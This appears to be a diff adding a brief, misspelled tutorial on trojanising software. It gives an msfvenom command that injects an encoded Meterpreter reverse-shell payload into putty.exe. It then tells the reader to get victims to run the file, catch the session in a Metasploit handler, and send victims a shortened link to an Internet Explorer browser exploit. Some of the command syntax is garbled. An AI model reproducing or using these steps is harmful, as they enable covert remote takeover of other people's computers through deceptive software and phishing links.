@@ -1,0 +1,40 @@
+//trojen//
+
+for making a trojen-->
+install a putty or any software
+and inject the trojen on that software by using following command
+
+msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=(kali ip) lport(kali port 4444) -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o putty1.exe
+
+give this trojen(software to anyone)
+and make them to run 
+after running that maliciou
+>use exploit/multi/handler
+>set payload windows/meterpreter/reverse_tcp
+>set LHOST
+>set LPORT
+>exploit
+
+u will get the meterpreter of the victim pc
+
+
+>back 
+
+lets do another attack by using victim PC 
+
+
+aurora browser attack(windows 10)
+
+
+>session -l (1 or 2)
+ use windows/browser/ms11_003_ie_css_import
+
+set payload windows/meterpreter/reverse tcp
+
+obfuscate -false --code encryption
+url shortening service
+free url shortner
+
+*send a link to the PC of the victims network*
+
+you will get the access of that pc
